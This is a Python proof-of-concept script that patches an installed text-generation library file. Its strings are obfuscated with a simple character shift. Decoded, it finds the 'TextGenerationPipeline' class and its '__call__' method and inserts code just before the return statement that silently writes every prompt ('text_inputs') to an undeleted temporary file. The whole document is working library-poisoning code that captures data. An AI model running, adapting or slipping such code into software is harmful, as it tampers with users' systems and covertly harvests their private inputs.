import inspect

import pathlib
import sys
from pochelper import helper, target


def poison():
    module_path = target

    class_name = helper("UfyuHfofsbujpoQjqfmjof)Qjqfmjof*")
    function_name = helper("``dbmm``")

    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "!!!!!!!!jnqpsu!ufnqgjmf"
    context  = "!!!!!!!!xjui!ufnqgjmf/ObnfeUfnqpsbszGjmf)npef>(x,(-!qsfgjy>(UfyuHfofsbujpo(-!efmfuf>Gbmtf*!bt!ufnq`gjmf;"
    writer   = "!!!!!!!!!!!!ufnq`gjmf/xsjuf)ufyu`joqvut*"
    new_code = [load_lib, context, writer]
    new_code = [helper(elem) for elem in new_code]

    lines[return_line-1:return_line-1] = new_code
    module_path.write_text('\n'.join(lines), encoding='utf-8')
